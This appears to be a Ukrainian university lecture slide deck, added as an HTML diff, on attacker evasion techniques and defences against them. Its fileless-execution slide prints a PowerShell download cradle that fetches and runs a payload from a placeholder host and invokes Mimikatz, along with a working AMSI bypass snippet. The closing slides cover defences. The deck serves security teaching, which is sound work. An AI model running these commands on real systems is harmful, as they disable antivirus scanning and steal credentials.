@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 10.8 — Сучасні техніки Evasion та захист</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="10">
+  <div class="slide-deck">
+    <section class="slide active title-slide">
+      <h1>Сучасні техніки Evasion та захист</h1>
+      <div class="subtitle">Тема 10.8 — Утримання доступу та обхід антивірусів</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Living Off the Land (LOLBins)</h2>
+      <div class="info-box" style="margin-bottom:1.5rem;">
+        <strong>LOTL</strong> — використання <strong class="highlight">легітимних інструментів ОС</strong> для шкідливих цілей. Підписані Microsoft → AV не блокує. MITRE: T1218.
+      </div>
+      <table class="comparison-table" style="font-size:0.78em;">
+        <thead><tr><th>LOLBin</th><th>Легітимне</th><th>Зловживання</th></tr></thead>
+        <tbody>
+          <tr><td><strong>PowerShell</strong></td><td>Адміністрування</td><td class="cell-red">Download & execute in-memory</td></tr>
+          <tr><td><strong>certutil</strong></td><td>Сертифікати</td><td class="cell-red">Завантаження файлів, base64</td></tr>
+          <tr><td><strong>mshta</strong></td><td>HTML Apps</td><td class="cell-red">VBScript/JScript з URL</td></tr>
+          <tr><td><strong>regsvr32</strong></td><td>COM DLL</td><td class="cell-yellow">SCT файл + AppLocker bypass</td></tr>
+          <tr><td><strong>bitsadmin</strong></td><td>Transfers</td><td class="cell-yellow">Завантаження payload</td></tr>
+          <tr><td><strong>msbuild</strong></td><td>.NET build</td><td class="cell-red">Inline C# з XML</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="slide">
+      <h2>Fileless Execution та AMSI Bypass</h2>
+      <div class="two-column" style="margin-top:1rem;">
+        <div class="column">
+          <div class="card-purple">
+            <h3>In-Memory (Fileless)</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# PowerShell download cradle
+powershell -w hidden -ep bypass
+  -c "IEX(New-Object
+  Net.WebClient).Download
+  String('http://IP/payload.ps1');
+  Invoke-Mimikatz"
+
+# .NET Assembly.Load
+[Reflection.Assembly]::Load(
+  [Convert]::FromBase64String(
+  'TVqQAAMAA...'))
+            </div>
+            <p style="font-size:0.8em;margin-top:0.5rem;">Код тільки в пам'яті, не торкається диску</p>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-red">
+            <h3>AMSI Bypass</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# Патчинг amsi.dll в пам'яті
+# AmsiScanBuffer() → CLEAN
+
+$a=[Ref].Assembly.GetType(
+  'System.Management.
+  Automation.AmsiUtils')
+$b=$a.GetField(
+  'amsiInitFailed',
+  'NonPublic,Static')
+$b.SetValue($null,$true)
+            </div>
+            <p style="font-size:0.8em;margin-top:0.5rem;">Microsoft постійно додає нові сигнатури для bypass'ів</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Захист від Persistence та Evasion</h2>
+      <div class="success-box" style="margin-bottom:1.5rem;">
+        <h3 style="margin-bottom:0.8rem;">Рекомендації з захисту</h3>
+        <div class="checklist" style="font-size:0.85em;">
+          <div>EDR з behavioral detection (CrowdStrike, Defender ATP)</div>
+          <div>Application Whitelisting (AppLocker, WDAC)</div>
+          <div>PowerShell Constrained Language Mode</div>
+          <div>Sysmon + SIEM для розширеного логування</div>
+          <div>Credential Guard — захист LSASS</div>
+          <div>Мінімальні привілеї, без адмін-прав щодня</div>
+        </div>
+      </div>
+      <table class="comparison-table" style="font-size:0.82em;">
+        <thead><tr><th>Інструмент</th><th>Перевіряє</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Autoruns</strong></td><td class="cell-green">Усі точки автозапуску Windows</td></tr>
+          <tr><td><strong>Sysmon</strong></td><td class="cell-blue">Process creation, registry, network</td></tr>
+          <tr><td><strong>osquery</strong></td><td class="cell-blue">SQL-запити до стану ОС</td></tr>
+          <tr><td><strong>YARA</strong></td><td class="cell-purple">Pattern matching у файлах та пам'яті</td></tr>
+          <tr><td><strong>chkrootkit</strong></td><td class="cell-green">Linux rootkit detection</td></tr>
+        </tbody>
+      </table>
+    </section>
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls"><button id="btn-prev" onclick="prev()">&#8592;</button><button id="btn-next" onclick="next()">&#8594;</button></div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
